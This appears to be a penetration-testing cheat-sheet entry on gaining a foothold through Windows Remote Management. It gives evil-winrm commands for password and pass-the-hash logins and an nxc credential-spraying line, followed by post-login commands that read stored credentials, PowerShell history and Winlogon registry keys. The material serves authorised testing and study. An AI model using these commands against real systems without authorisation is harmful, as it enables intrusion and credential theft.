---
id: winrm
title: WinRM Access
stage: foothold
tags: [windows, ad]
tools:
  - evil-winrm -i $IP -u $USER -p $PASS
  - evil-winrm -i $IP -u $USER -H $NTLM_HASH
  - nxc winrm $IP -u $USER -p $PASS
leads_to:
  - token-impersonation
  - windows-stored-creds
  - windows-sebackup
  - acl-abuse
  - dcsync
  - bloodhound
---

## Connect

```bash
# Password auth
evil-winrm -i $IP -u $USER -p $PASS

# Pass-the-hash (no need to crack NTLM)
evil-winrm -i $IP -u $USER -H $NTLM_HASH

# HTTPS
evil-winrm -i $IP -u $USER -p $PASS -S
```

## Check Access First

```bash
nxc winrm $IP -u $USER -p $PASS    # "Pwn3d!" = can connect
nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success
```

## After Landing — Run Immediately

```powershell
whoami /all           # privileges + group memberships
whoami /priv          # check SeImpersonatePrivilege → GodPotato if present
net localgroup Administrators
ipconfig /all         # additional subnets
netstat -ano          # internal ports → pivot if needed
cmdkey /list          # stored credentials
(Get-PSReadlineOption).HistorySavePath  # then read that file
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Notes

WinRM = ports 5985 (HTTP) or 5986 (HTTPS). User must be in `Remote Management Users` group or local admin. evil-winrm supports PtH, so no cracking required if you have the NTLM hash.
